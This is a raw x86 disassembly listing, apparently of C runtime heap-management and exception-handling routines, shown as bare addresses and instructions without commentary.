  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
